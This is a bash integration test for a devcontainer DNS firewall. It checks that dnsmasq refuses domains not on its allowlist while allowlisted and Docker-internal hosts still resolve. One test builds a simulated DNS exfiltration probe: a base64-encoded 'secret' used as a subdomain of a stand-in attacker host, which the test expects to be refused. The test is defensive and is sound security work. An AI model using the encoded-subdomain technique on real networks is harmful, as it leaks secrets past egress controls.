#!/usr/bin/env bash
# integration/test-dns-strict.sh — runtime validation of session 3.
#
# Verifies that dnsmasq returns REFUSED for non-allowlisted domains (gap
# #9 closed) AND that allowlisted hosts, Docker siblings, and
# host.docker.internal continue to resolve correctly.
#
# Must run inside the post-bake devcontainer (where the rebuilt image
# carries the v2 dnsmasq.conf without `server=127.0.0.11`). Each test
# auto-skips if the bake hasn't taken effect.

source "$(dirname "${BASH_SOURCE[0]}")/../lib.sh"

DNS_PORT=53
DNS_ADDR=127.0.0.53
DIRECT_TCP_ALLOW=/etc/devcontainer-firewall/direct-tcp-allow.txt

_post_bake() {
  in_container || return 1
  [ -d /etc/devcontainer-firewall ] || return 1
  command -v dig >/dev/null 2>&1 || return 1
  if command -v findmnt >/dev/null 2>&1; then
    findmnt -n /etc/devcontainer-firewall >/dev/null 2>&1 && return 1
  fi
  return 0
}

# Returns 0 iff `dig` reports `status: REFUSED` for $1.
_dig_status_is_refused() {
  local host="$1"
  dig +noall +comments +time=2 +tries=1 "$host" @"$DNS_ADDR" 2>/dev/null \
    | grep -qE 'status: REFUSED'
}

# Returns 0 iff `dig +short` returns at least one IPv4 line for $1.
_dig_resolves() {
  local host="$1"
  dig +short +time=2 +tries=1 "$host" @"$DNS_ADDR" 2>/dev/null \
    | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'
}

test_poc9_evil_subdomain_refused() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  local payload
  payload="$(printf 'secret-%s-%s' "$$" "$(date +%s)" | base64 | tr -d '=' | tr '+/' '-_')"
  local probe="${payload}.attacker.example.invalid"
  assert_true _dig_status_is_refused "$probe" -- \
    "PoC #9 : dig ${probe} → REFUSED (no upstream leak)"
}

test_unlisted_random_refused() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  local probe="random-$$-$(date +%s).example.invalid"
  assert_true _dig_status_is_refused "$probe" -- \
    "dig ${probe} → REFUSED (catch-all dropped)"
}

test_allowlisted_anthropic_resolves() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  assert_true _dig_resolves api.anthropic.com -- \
    "dig api.anthropic.com → returns IPv4 (allowlist regression)"
}

test_session2_bridge_resolves() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  assert_true _dig_resolves bridge.claudeusercontent.com -- \
    "dig bridge.claudeusercontent.com → returns IPv4 (session 2 pre-allowlist)"
}

test_session2_codedocs_resolves() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  assert_true _dig_resolves code.claude.com -- \
    "dig code.claude.com → returns IPv4 (session 2 pre-allowlist)"
}

test_hostdockerinternal_resolves() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  # Resolved by the ollama block in init-firewall.sh via host-record=,
  # NOT by the sibling-resolve loop. Must work even though direct-tcp-
  # allow.txt entry `host:11434` is commented out in cloud mode.
  assert_true _dig_resolves host.docker.internal -- \
    "dig host.docker.internal → returns IPv4 (ollama-block host-record)"
}

test_sibling_claudebridge_resolves_when_active() {
  _post_bake || { skip_test "not in post-bake container"; return; }
  if [ ! -f "$DIRECT_TCP_ALLOW" ]; then
    skip_test "direct-tcp-allow.txt not baked"
    return
  fi
  if ! grep -qE '^[[:space:]]*claude-bridge:[0-9]+' "$DIRECT_TCP_ALLOW"; then
    skip_test "claude-bridge not active in direct-tcp-allow.txt (cloud mode)"
    return
  fi
  assert_true _dig_resolves claude-bridge -- \
    "dig claude-bridge → returns Docker peer IPv4 (sibling-resolve loop)"
}

run_tests
